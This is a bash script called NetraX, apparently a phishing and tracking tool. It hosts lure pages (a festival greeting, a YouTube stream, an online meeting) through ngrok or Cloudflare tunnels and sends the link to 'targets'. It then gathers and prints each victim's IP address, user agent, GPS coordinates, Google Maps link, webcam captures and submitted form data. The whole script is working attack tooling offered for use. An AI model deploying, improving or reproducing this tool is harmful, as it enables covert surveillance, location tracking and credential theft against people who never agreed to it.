#!/bin/bash
# --------------------------------------------------
# NetraX
# Created, Developed & Maintained by GarudaNetra
# GitHub: https://github.com/Garuda-Netra
# --------------------------------------------------

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\n"
printf "\e[1;96m    ╔══════════════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;96m    ║                                                                  ║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m███╗   ██╗\e[0m\e[1;77m ███████╗\e[0m\e[1;92m ████████╗\e[0m\e[1;77m ██████╗ \e[0m\e[1;92m  █████╗\e[0m\e[1;93m        \e[0m\e[1;91m ██╗    ██╗\e[0m\e[1;96m║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m████╗  ██║\e[0m\e[1;77m ██╔════╝\e[0m\e[1;92m ╚══██╔══╝\e[0m\e[1;77m ██╔══██╗\e[0m\e[1;92m ██╔══██╗\e[0m\e[1;93m        \e[0m\e[1;91m ╚██╗██╔╝\e[0m\e[1;96m ║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m██╔██╗ ██║\e[0m\e[1;77m █████╗  \e[0m\e[1;92m    ██║   \e[0m\e[1;77m ██████╔╝\e[0m\e[1;92m ███████║\e[0m\e[1;93m ██████ \e[0m\e[1;91m  ╚███╔╝ \e[0m\e[1;96m ║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m██║╚██╗██║\e[0m\e[1;77m ██╔══╝  \e[0m\e[1;92m    ██║   \e[0m\e[1;77m ██╔══██╗\e[0m\e[1;92m ██╔══██║\e[0m\e[1;93m        \e[0m\e[1;91m  ██╔██╗ \e[0m\e[1;96m ║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m██║ ╚████║\e[0m\e[1;77m ███████╗\e[0m\e[1;92m    ██║   \e[0m\e[1;77m ██║  ██║\e[0m\e[1;92m ██║  ██║\e[0m\e[1;93m       \e[0m\e[1;91m ██╔╝   ██╗\e[0m\e[1;96m║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m╚═╝  ╚═══╝\e[0m\e[1;77m ╚══════╝\e[0m\e[1;92m    ╚═╝   \e[0m\e[1;77m ╚═╝  ╚═╝\e[0m\e[1;92m ╚═╝  ╚═╝\e[0m\e[1;93m       \e[0m\e[1;91m ╚═╝    ╚═╝\e[0m\e[1;96m║\e[0m\n"
printf "\e[1;96m    ║                                                                  ║\e[0m\n"
printf "\e[1;96m    ╚══════════════════════════════════════════════════════════════════╝\e[0m\n"
printf "\n"
printf "\e[1;93m    ====================================================\e[0m\n"
printf "\e[1;96m                 ⚡ 🌻 👁  NETRA-X  👁 🌻 ⚡\e[0m\n"
printf "\e[1;93m    ====================================================\e[0m\n"
printf "\n"
printf "\e[1;77m    github.com/Garuda-Netra  |  Created by GarudaNetra\e[0m\n"
printf "\n"
printf "\e[1;90m    ----------------------------------------------------\e[0m\n"
printf "\n"
printf "\e[1;93m     ॐ असतो मा सद्गमय ।\e[0m\n"
printf "\e[1;93m     तमसो मा ज्योतिर्गमय ।\e[0m\n"
printf "\e[1;93m     मृत्योर्मा अमृतं गमय ॥\e[0m\n"
printf "\n"
printf "\e[1;77m    Meaning:\e[0m\n"
printf "\e[1;77m    Lead us from untruth to truth,\e[0m\n"
printf "\e[1;77m    From darkness to light,\e[0m\n"
printf "\e[1;77m    From mortality to immortality.\e[0m\n"
printf "\n"
printf "\e[1;90m    ----------------------------------------------------\e[0m\n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
if [[ "$windows_mode" == true ]]; then
  # Windows-specific process termination
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  # Unix-like systems
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

catch_ip() {
  if [[ -e "data/ip_logs.txt" ]]; then
    last_entry=$(tail -n 1 "data/ip_logs.txt")
    ip=$(echo "$last_entry" | grep -oP 'IP: \K[^ |]+')
    ua=$(echo "$last_entry" | grep -oP 'User-Agent: \K.*')
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
    echo "$last_entry" >> data/saved_ip.txt
  else
    printf "\e[1;91m[!] ip_logs.txt not found.\e[0m\n"
  fi
}

catch_location() {
  # Find newest individual location file under data/
  location_file=$(ls -t data/location_*.txt 2>/dev/null | head -n 1)
  if [[ -n "$location_file" ]]; then
    lat=$(grep 'Latitude:' "$location_file" | awk '{print $2}')
    lon=$(grep 'Longitude:' "$location_file" | awk '{print $2}')
    acc=$(grep 'Accuracy:' "$location_file" | awk '{print $2}')
    maps_link=$(grep 'Google Maps:' "$location_file" | awk '{print $2}')
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" "$lat"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" "$lon"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" "$acc"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" "$maps_link"
    # Archive inside /data/saved_locations/
    if [[ ! -d "data/saved_locations" ]]; then
      mkdir -p data/saved_locations
    fi
    mv "$location_file" "data/saved_locations/" 2>/dev/null
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved: data/saved_locations/%s\e[0m\n" "$(basename $location_file)"
  else
    printf "\e[1;91m[!] No location file found in data/.\e[0m\n"
  fi
}

checkfound() {
# Ensure directories exist
if [[ ! -d "data" ]]; then
  mkdir -p data
fi
if [[ ! -d "data/saved_locations" ]]; then
  mkdir -p data/saved_locations
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
while true; do

  # ── New IP hit ──
  if [[ -e "data/.flag_ip" ]]; then
    rm -f "data/.flag_ip"
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\e[0m\n"
    catch_ip
  fi

  sleep 0.5

  # ── New location ──
  if [[ -e "data/.flag_location" ]]; then
    rm -f "data/.flag_location"
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
    catch_location
  fi

  # ── New camera capture ──
  if [[ -e "data/.flag_cam" ]]; then
    cam_path=$(cat "data/.flag_cam" 2>/dev/null)
    rm -f "data/.flag_cam"
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Camera capture received!\e[0m\n"
    if [[ -n "$cam_path" ]]; then
      printf "\e[1;93m[\e[0m+\e[1;93m] Saved: %s\e[0m\n" "$cam_path"
    fi
  fi

  # ── New form submission ──
  if [[ -e "data/.flag_form" ]]; then
    form_data=$(cat "data/.flag_form" 2>/dev/null)
    rm -f "data/.flag_form"
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Form submission received!\e[0m\n"
    printf "\e[1;93m%s\e[0m\n" "$form_data"
  fi

  sleep 0.5

done
}

# --------------------------------------------------
# install_cloudflared
# Downloads the correct cloudflared binary for this
# OS/arch into the project directory.  Does NOT touch
# any system paths, package managers, or global config.
# Returns: 0 on success, 1 on failure (non-fatal —
#          caller decides whether to abort or advise).
# --------------------------------------------------
install_cloudflared() {
  # Prefer wget; fall back to curl when wget is absent
  local downloader=""
  if command -v wget > /dev/null 2>&1; then
    downloader="wget"
  elif command -v curl > /dev/null 2>&1; then
    downloader="curl"
  else
    printf "\e[1;91m[!] Neither wget nor curl is available. Cannot auto-install cloudflared.\e[0m\n"
    return 1
  fi

  local arch os base_url="https://github.com/cloudflare/cloudflared/releases/latest/download"
  arch=$(uname -m 2>/dev/null || echo "unknown")
  os=$(uname -s 2>/dev/null || echo "unknown")

  printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: %s, Architecture: %s\e[0m\n" "$os" "$arch"
  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading cloudflared into project directory...\e[0m\n"

  local download_url="" dest=""

  if [[ "$windows_mode" == true ]]; then
    # ── Windows (WSL / Git-Bash / MSYS) ─────────────────────────────────
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\e[0m\n"
    download_url="${base_url}/cloudflared-windows-amd64.exe"
    dest="cloudflared.exe"

  elif [[ "$os" == "Darwin" ]]; then
    # ── macOS ─────────────────────────────────────────────────────────────
    printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\e[0m\n"
    if [[ "$arch" == "arm64" ]]; then
      printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\e[0m\n"
      download_url="${base_url}/cloudflared-darwin-arm64.tgz"
    else
      printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\e[0m\n"
      download_url="${base_url}/cloudflared-darwin-amd64.tgz"
    fi
    dest="cloudflared.tgz"

  else
    # ── Linux / Termux / other Unix-like ──────────────────────────────────
    case "$arch" in
      "x86_64")
        printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\e[0m\n"
        download_url="${base_url}/cloudflared-linux-amd64"
        ;;
      "i686"|"i386")
        printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\e[0m\n"
        download_url="${base_url}/cloudflared-linux-386"
        ;;
      "aarch64"|"arm64")
        printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\e[0m\n"
        download_url="${base_url}/cloudflared-linux-arm64"
        ;;
      "armv7l"|"armv6l"|"arm")
        printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\e[0m\n"
        download_url="${base_url}/cloudflared-linux-arm"
        ;;
      *)
        printf "\e[1;93m[!] Unknown architecture (%s). Defaulting to linux-amd64...\e[0m\n" "$arch"
        download_url="${base_url}/cloudflared-linux-amd64"
        ;;
    esac
    dest="cloudflared"
  fi

  # ── Perform the download ─────────────────────────────────────────────────
  if [[ "$downloader" == "wget" ]]; then
    wget --no-check-certificate "$download_url" -O "$dest" > /dev/null 2>&1
  else
    curl -fsSL "$download_url" -o "$dest" 2>/dev/null
  fi

  # Verify the download produced a non-empty file
  if [[ ! -s "$dest" ]]; then
    printf "\e[1;91m[!] Download failed or the file is empty. Check your internet connection.\e[0m\n"
    rm -f "$dest"
    return 1
  fi

  # ── macOS: extract the .tgz archive ─────────────────────────────────────
  if [[ "$os" == "Darwin" && "$dest" == "cloudflared.tgz" ]]; then
    tar -xzf cloudflared.tgz > /dev/null 2>&1
    rm -f cloudflared.tgz
    if [[ ! -e "cloudflared" ]]; then
      printf "\e[1;91m[!] Extraction failed. The archive may be corrupt.\e[0m\n"
      return 1
    fi
  fi

  # ── Make executable ──────────────────────────────────────────────────────
  if [[ "$windows_mode" == true ]]; then
    chmod +x cloudflared.exe 2>/dev/null
    # Create a thin POSIX wrapper so the rest of the script always calls ./cloudflared
    printf '#!/bin/bash\n./cloudflared.exe "$@"\n' > cloudflared
    chmod +x cloudflared
  else
    chmod +x cloudflared
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] cloudflared installed successfully into the project directory.\e[0m\n"
  return 0
}

# --------------------------------------------------
# cloudflare_tunnel
# Resolves the cloudflared binary (local → PATH →
# auto-install), validates it, then starts a PHP
# server + Cloudflare Quick Tunnel and waits for the
# public URL.
# --------------------------------------------------
cloudflare_tunnel() {
  # ── Step 1: Resolve cloudflared binary ──────────────────────────────────
  # Priority: (a) local project binary → (b) system PATH → (c) auto-install
  local cf_bin=""

  # (a) Local binary inside the project directory
  if [[ "$windows_mode" == true ]] && [[ -e "./cloudflared.exe" ]]; then
    cf_bin="./cloudflared.exe"
  elif [[ -e "./cloudflared" ]]; then
    cf_bin="./cloudflared"
  fi

  # (b) System-wide installation on PATH (does not override local copy)
  if [[ -z "$cf_bin" ]] && command -v cloudflared > /dev/null 2>&1; then
    cf_bin="cloudflared"
    printf "\e[1;92m[\e[0m+\e[1;92m] Found cloudflared in system PATH: %s\e[0m\n" "$(command -v cloudflared)"
  fi

  # (c) Not found anywhere — attempt isolated install into project directory
  if [[ -z "$cf_bin" ]]; then
    printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared not found locally or in PATH.\e[0m\n"
    printf "\e[1;93m[\e[0m!\e[1;93m] Attempting automatic installation (project directory only)...\e[0m\n"

    if ! install_cloudflared; then
      printf "\e[1;91m[!] Automatic installation failed. Cannot start CloudFlare tunnel.\e[0m\n"
      printf "\e[1;93m[*] Install cloudflared manually, then re-run the script:\e[0m\n"
      printf "\e[1;93m      1. Download from: https://github.com/cloudflare/cloudflared/releases\e[0m\n"
      printf "\e[1;93m      2. Place the binary in this project directory\e[0m\n"
      printf "\e[1;93m      3. Run:     chmod +x cloudflared\e[0m\n"
      printf "\e[1;93m      4. Re-run:  bash netraX.sh\e[0m\n"
      exit 1
    fi

    # Re-resolve after successful installation
    if [[ "$windows_mode" == true ]] && [[ -e "./cloudflared.exe" ]]; then
      cf_bin="./cloudflared.exe"
    elif [[ -e "./cloudflared" ]]; then
      cf_bin="./cloudflared"
    else
      printf "\e[1;91m[!] cloudflared binary not found after installation. Something went wrong.\e[0m\n"
      exit 1
    fi
  fi

  # ── Step 2: Validate the binary actually executes ───────────────────────
  if ! "$cf_bin" --version > /dev/null 2>&1; then
    printf "\e[1;91m[!] cloudflared found at '%s' but failed to run.\e[0m\n" "$cf_bin"
    printf "\e[1;93m[*] Possible causes: corrupt download, wrong architecture, or missing execute permission.\e[0m\n"
    printf "\e[1;93m[*] To fix, remove the binary and re-run (it will re-download automatically):\e[0m\n"
    printf "\e[1;93m      rm -f cloudflared cloudflared.exe && bash netraX.sh\e[0m\n"
    exit 1
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] cloudflared ready — %s\e[0m\n" "$("$cf_bin" --version 2>&1 | head -n1)"

  # ── Step 3: Start the PHP server ────────────────────────────────────────
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
  php -S 127.0.0.1:3333 >/dev/null 2>&1 &
  sleep 2

  # ── Step 4: Start the cloudflared Quick Tunnel ──────────────────────────
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\e[0m\n"
  rm -f .cloudflared.log
  "$cf_bin" tunnel --url http://127.0.0.1:3333 > .cloudflared.log 2>&1 &

  # ── Step 5: Wait for the public URL (up to 30 s) ────────────────────────
  printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for tunnel URL (up to 30s)...\e[0m\n"
  local link=""
  for i in $(seq 1 30); do
    sleep 1
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ".cloudflared.log" 2>/dev/null)
    if [[ -n "$link" ]]; then
      break
    fi
  done

  if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Tunnel URL not generated. Possible reasons:\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] CloudFlare tunnel service might be temporarily down\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] If you are on Android, enable the mobile hotspot\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] cloudflared may already be running — run: killall cloudflared\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Check your internet connection\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] For detailed errors, run manually:\e[0m\n"
    printf "\e[1;93m      %s tunnel --url http://127.0.0.1:3333\e[0m\n" "$cf_bin"
    if [[ "$windows_mode" == true ]]; then
      printf "\e[1;93m[\e[0m*\e[1;93m] On Windows (without WSL): cloudflared.exe tunnel --url http://127.0.0.1:3333\e[0m\n"
    fi
    exit 1
  fi

  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
  payload_cloudflare
  checkfound
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ".cloudflared.log" 2>/dev/null)
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' GreetingsPortal.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveStreamYT.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' VirtualMeeting.html > index2.html
fi
rm -rf index3.html
}

ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok.exe
        rm -rf ngrok.zip
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

# Ngrok auth token handling
if [[ "$windows_mode" == true ]]; then
    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat "$USERPROFILE\.ngrok2\ngrok.yml"
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 >/dev/null &
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok.exe http 3333 > /dev/null 2>&1 &
else
    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat  ~/.ngrok2/ngrok.yml
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 >/dev/null &
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
fi

sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' GreetingsPortal.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveStreamYT.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' VirtualMeeting.html > index2.html
fi
rm -rf index3.html
}

netraX() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\e[1;93m    ----- Choose tunnel server -----\e[0m\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
netraX
fi
}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
netraX
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Season’s Greetings\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m YouTube Streaming\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Conference\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name:-NETRA-X Celebration}"
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
while true; do
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID or URL: \e[0m' yt_video_ID
    # ── PART 1: Trim leading/trailing whitespace ──────────────────────────
    yt_video_ID="${yt_video_ID#"${yt_video_ID%%[![:space:]]*}"}"
    yt_video_ID="${yt_video_ID%"${yt_video_ID##*[![:space:]]}"}"
    # ── PART 2: Extract bare ID when a full URL is pasted ─────────────────
    #   Handles: https://www.youtube.com/watch?v=ID[&...]
    #            https://youtu.be/ID[?...]
    if [[ "$yt_video_ID" =~ youtube\.com/watch\?.*v=([A-Za-z0-9_-]{11}) ]]; then
        yt_video_ID="${BASH_REMATCH[1]}"
    elif [[ "$yt_video_ID" =~ youtu\.be/([A-Za-z0-9_-]{11}) ]]; then
        yt_video_ID="${BASH_REMATCH[1]}"
    fi
    # ── PART 3: Validate — exactly 11 chars, A-Z a-z 0-9 - _ ─────────────
    if [[ "$yt_video_ID" =~ ^[A-Za-z0-9_-]{11}$ ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Video ID: %s\n\e[0m" "$yt_video_ID"
        break
    else
        printf "\e[1;91m [!] Invalid YouTube Video ID. Must be exactly 11 characters (A-Z, a-z, 0-9, -, _). Try again.\e[0m\n"
    fi
done
elif [[ $option_tem -eq 3 ]]; then
printf ""
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

banner
dependencies
netraX
